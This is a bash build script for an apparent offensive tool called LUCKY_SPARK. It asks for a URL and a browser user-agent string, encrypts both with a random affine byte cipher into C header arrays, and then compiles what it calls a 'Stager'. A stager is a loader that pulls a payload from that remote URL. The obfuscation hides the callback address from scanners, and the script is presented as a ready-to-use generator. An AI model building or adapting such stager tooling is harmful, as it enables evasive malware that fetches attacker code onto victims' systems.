#!/bin/bash
clear
    echo '      *         .     .  
   .     *  LUCKY_SPARK   . *   *   .    *    
      *       .       *       .'


DEFAULT_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"

URL=""
USERAGENT=""
CONFIG_ONLY=false

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -u|-url)
            if [[ -n "$2" ]]; then
                URL="$2"
                shift 2
            else
                echo "Error: -url requires a value"
                exit 1
            fi
            ;;
        -a|-agent)
            if [[ -n "$2" ]]; then
                USERAGENT="$2"
                shift 2
            else
                echo "Error: -agent requires a value"
                exit 1
            fi
            ;;
        -h|--help)
            echo "Usage: $0 -url <URL> [-agent <User-Agent>] [-c|--config]"
            exit 0
            ;;
        -c|--config)
            echo "Generating only Config File"
            CONFIG_ONLY=true
            shift 1
            ;;
        *)
            echo "Unknown parameter: $1"
            exit 1
            ;;
    esac
done

if [[ -z "$URL" ]]; then
    read -p "Enter URL: " URL
fi

if [[ -z "$USERAGENT" ]]; then
    read -p "Enter User-Agent (leave empty for default): " USERAGENT
fi

if [[ -z "$USERAGENT" ]]; then
    USERAGENT="$DEFAULT_UA"
fi

if [[ -z "$URL" ]]; then
    echo "Error: URL must not be empty."
    exit 1
fi

if [ "$CONFIG_ONLY" = false ]; then
   make cleanAll > .makelogs.txt
fi


# Function to generate a random odd number between 1 and 255
generate_odd() {
  local num=$((RANDOM % 256))  # Random number 0-255
  if (( num % 2 == 0 )); then
    num=$((num + 1))
  fi
  if (( num > 255 )); then
    num=$((num - 2))
  fi
  echo $num
}

# Extended Euclidean Algorithm to find modular inverse
modinv() {
  local a=$1
  local m=$2
  local m0=$m
  local y=0
  local x=1

  if (( m == 1 )); then
    echo 0
    return
  fi

  while (( a > 1 )); do
    local q=$((a / m))
    local t=$m

    m=$((a % m))
    a=$t

    t=$y
    y=$((x - q * y))
    x=$t
  done

  if (( x < 0 )); then
    x=$((x + m0))
  fi

  echo $x
}





# Function to encrypt a string including the null terminator
# Output as comma-separated 0xHH bytes
encrypt_string_c_hex() {
    local input="$1"
    local i char ascii obf
    local output=""

    # Loop through each character + null terminator
    for (( i=0; i<=${#input}; i++ )); do
        if (( i < ${#input} )); then
            char="${input:$i:1}"
            ascii=$(printf "%d" "'$char")
        else
            # Null terminator
            ascii=0
        fi
        # Apply OBF_BYTE: (A * ascii + B) % 256
        obf=$(( (A * ascii + B) & 0xFF ))
        # Append as 0xHH, comma-separated
        if [[ -n "$output" ]]; then
            output+=", "
        fi
        output+="0x$(printf "%02X" "$obf")"
    done

    echo "$output"
}


A=$(generate_odd)
B=$(generate_odd)
INV_A=$(modinv $A 256)

OBFUSCATED_URL=$(encrypt_string_c_hex "$URL")
OBFUSCATED_AGENT=$(encrypt_string_c_hex "$USERAGENT")

echo "#pragma once" > ./inc/lucky_obf_configs.h
echo "" >> ./inc/lucky_obf_configs.h
echo "#define A  $A" >> ./inc/lucky_obf_configs.h
echo "#define B $B">> ./inc/lucky_obf_configs.h
echo "#define INV_A $INV_A">> ./inc/lucky_obf_configs.h


echo "#pragma once" > ./inc/lucky_net_configs.h
echo "" >> ./inc/lucky_net_configs.h
echo "const unsigned char s_Url[] = { $OBFUSCATED_URL };" >> ./inc/lucky_net_configs.h
echo "const unsigned char s_UserAgent[] = { $OBFUSCATED_AGENT };" >> ./inc/lucky_net_configs.h


frames=(
'   *     .       *     .       *    
       .    Generating Stager ...   *   .
  *       .       *       .       *'
'       *       .         *    
    *       Generating Stager ...     *
       .        *       .'
'   .     *       .       *      
       *    Generating Stager ...   .    
  .       *       .       *'
'      *         .     .  
   .     *  Generating Stager ...     .    *    
      *       .       *       .'
)

# Function to show multi-line throbber while a command runs
show_spinner() {
    local pid=$1
    local delay=0.3
    local i=0

    while kill -0 "$pid" 2>/dev/null; do
        clear
        echo "${frames[i]}"
        ((i=(i+1)%${#frames[@]}))
        sleep $delay
    done
}


if [ "$CONFIG_ONLY" = false ]; then

    make all >> .makelogs.txt 2>&1 &
    MAKE_PID=$!
    show_spinner $MAKE_PID
    wait $MAKE_PID
    MAKE_EXIT_CODE=$?   

    clear

    if [ $MAKE_EXIT_CODE -eq 0 ]; then
		rm -rf ./obj
        echo '      *         .     .  
   .     *  Stager Generation done!   .    *    
      *       .       *       .'
    else
        echo '      !         .     .  
   .     !  Make failed! Check .makelogs.txt   .    !    
      !       .       !       .'
        exit $MAKE_EXIT_CODE  
    fi

fi




